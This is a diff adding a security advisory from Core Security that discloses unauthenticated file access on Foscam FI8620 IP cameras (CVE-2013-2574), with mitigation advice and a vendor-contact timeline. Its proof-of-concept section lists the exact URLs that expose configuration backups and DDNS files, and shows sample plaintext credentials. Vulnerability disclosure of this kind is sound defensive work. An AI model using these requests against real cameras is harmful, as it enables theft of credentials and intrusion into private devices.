@@ -1,0 +1,234 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+FOSCAM IP-Cameras Improper Access Restrictions
+
+
+1. *Advisory Information*
+
+Title: FOSCAM IP-Cameras Improper Access Restrictions
+Advisory ID: CORE-2013-0613
+Advisory URL:
+http://www.coresecurity.com/advisories/foscam-ip-cameras-improper-access-restrictions
+Date published: 2013-07-23
+Date of last update: 2013-07-23
+Vendors contacted: Foscam
+Release mode: User release
+
+
+2. *Vulnerability Information*
+
+Class: Information Exposure [CWE-200]
+Impact: Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-2574
+
+
+3. *Vulnerability Description*
+
+Due to improper access restriction the FOSCAM FI8620 device [1] allows a
+remote attacker to browse and access arbitrary files from the following
+directories '/tmpfs/' and '/log/' without requiring authentication. This
+could allow a remote attacker to obtain valuable information such as
+access credentials, Wi-Fi configuration and other sensitive information
+in plain text.
+
+The list of affected files includes, but is not limited to, the following:
+
+   . 'http://<target_ip>/tmpfs/config_backup.bin'
+   . 'http://<target_ip>/tmpfs/config_restore.bin'
+   . 'http://<target_ip>/tmpfs/ddns.conf'
+   . 'http://<target_ip>/tmpfs/syslog.txt'
+   . 'http://<target_ip>/log/syslog.txt'
+
+
+4. *Vulnerable Packages*
+
+   . FOSCAM FI8620 PTZ Camera.
+   . Other Foscam devices based on the same firmware are probably
+affected too, but they were not checked.
+
+
+5. *Non-Vulnerable Packages*
+
+Vendor did not provide details. Contact Foscam for further information.
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+There was no official answer from Foscam after several attempts (see
+[Sec. 9]); contact vendor for further information. Some mitigation
+actions may be do not expose the camera to internet unless absolutely
+necessary and have at least one proxy filtering HTTP requests to the
+following resources:
+
+   . '/tmpfs/config_backup.bin'
+   . '/tmpfs/config_restore.bin'
+   . '/tmpfs/ddns.conf'
+   . '/tmpfs/syslog.txt'
+   . '/log/syslog.txt'
+
+
+7. *Credits*
+
+This vulnerability was discovered by Flavio de Cristofaro and researched
+with the help of Andres Blanco from Core Security Technologies. The
+publication of this advisory was coordinated by Fernando Miranda from
+Core Advisories Team.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+8.1. *Accessing Manufacturer DDNS configuration*
+
+By requesting the following URL using your default web browser:
+
+
+/-----
+http://<target_ip>/tmpfs/ddns.conf
+-----/
+
+you will see something like this:
+
+
+/-----
+[LoginInfo]
+HostName=ddns.myfoscam.org
+HostIP=113.105.65.47
+Port=8080
+UserName=<target username>
+Password=<target plain password>
+[Domain]
+Domain=<target username>.myfoscam.org;
+-----/
+
+
+8.2. *Access Credentials Stored in Backup Files*
+
+When a configuration backup is required by an operator/administrator,
+the backup is generated in the local folder 'tmpfs' named as
+'config_backup.bin'. The binary file is just a dump of the whole
+configuration packed as Gzip and can be accessed by accessing the
+following URL:
+
+/-----
+http://<target_ip>/tmpfs/config_backup.bin
+-----/
+
+The presence of this temporary file enables an unauthenticated attacker
+to download the configuration files which contain usernames, plaintext
+passwords (including admin passwords), Wifi configuration including
+plain PSK, among other interesting stuff as shown below:
+
+/-----
+username             = "admin           "
+password             = "admin           "
+authtype             = "15              "         
+authgroup            = "                "
+[user1]
+username             = "user            "
+password             = "user            "
+authtype             = "3               "         
+authgroup            = "                "
+[user2]
+username             = "guest           "
+password             = "guest           "
+authtype             = "1               "         
+authgroup            = "                "
+-----/
+
+It is important to mention that, in order to access the configuration
+file previously mentioned, an operator and/or administrator should have
+executed the backup process in advance.
+
+
+9. *Report Timeline*
+. 2013-06-12:
+Core Security Technologies notifies the Foscam team of the vulnerability.
+
+. 2013-06-12:
+Vendor acknowledges the receipt of the email and asks for technical
+details.
+
+. 2013-06-13:
+A draft report with technical details and a PoC is sent to vendor.
+Publication date is set for Jul 3rd, 2013.
+
+. 2013-06-17:
+Core asks if the vulnerabilities are confirmed.
+
+. 2013-06-17:
+Foscam product team notifies that they have checked CORE's website [2],
+but there is no Foscam info.
+
+. 2013-06-18:
+Core notifies that the advisory has not been published yet and re-sends
+technical details and proof of concept.
+
+. 2013-06-26:
+CORE asks for a reply.
+
+. 2013-07-03:
+First release date missed.
+
+. 2013-07-03:
+Core asks for a reply.
+
+. 2013-07-11:
+Core notifies that the issues were reported 1 month ago and there was no
+reply since [2013-06-18].
+
+. 2013-07-23:
+Core releases the advisory CORE-2013-0613 tagged as user-release.
+
+
+10. *References*
+
+[1] Foscam FI8620 - http://www.foscam.com/prd_view.aspx?id=176.
+[2] CORE Security Advisories http://www.coresecurity.com/grid/advisories.
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
